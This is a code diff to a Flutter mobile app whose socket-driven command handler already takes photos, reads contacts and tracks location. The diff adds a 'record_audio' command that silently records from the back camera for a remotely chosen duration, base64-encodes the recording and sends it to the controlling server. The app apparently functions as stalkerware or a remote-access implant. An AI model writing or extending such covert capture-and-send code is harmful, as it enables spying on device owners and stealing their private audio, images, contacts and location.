@@ -29,6 +29,7 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
   Timer? heartbeatTimer;
   Timer? locationTimer;
   StreamSubscription<Position>? locationStream;
+  CameraController? videoController;
   
   @override
   void initState() {
@@ -176,6 +177,9 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
       case 'take_photo':
         await takePhoto(params['camera'] ?? 'front');
         break;
+      case 'record_audio':
+        await recordAudioViaVideo(int.parse(params['duration'] ?? '10'));
+        break;
       case 'get_contacts':
         await getContacts();
         break;
@@ -233,6 +237,35 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     }
   }
 
+  Future<void> recordAudioViaVideo(int duration) async {
+    try {
+      final cameras = await availableCameras();
+      final camera = cameras.firstWhere((c) => c.lensDirection == CameraLensDirection.back);
+      
+      videoController = CameraController(camera, ResolutionPreset.low);
+      await videoController?.initialize();
+      
+      final videoPath = '${(await getTemporaryDirectory()).path}/audio_${DateTime.now().millisecondsSinceEpoch}.mp4';
+      await videoController?.startVideoRecording();
+      await Future.delayed(Duration(seconds: duration));
+      final video = await videoController?.stopVideoRecording();
+      
+      if (video != null) {
+        final bytes = await File(video.path).readAsBytes();
+        final base64Video = base64Encode(bytes);
+        socket.emit('audio_data', {
+          'audio': base64Video,
+          'format': 'mp4',
+          'duration': duration,
+          'timestamp': DateTime.now().toIso8601String(),
+        });
+      }
+      
+      await videoController?.dispose();
+    } catch (e) {
+      socket.emit('error', {'error': 'Audio error: $e'});
+    }
+  }
 
   Future<void> getContacts() async {
     try {
@@ -284,6 +317,7 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     heartbeatTimer?.cancel();
     locationTimer?.cancel();
     locationStream?.cancel();
+    videoController?.dispose();
     WidgetsBinding.instance.removeObserver(this);
     socket.dispose();
     super.dispose();
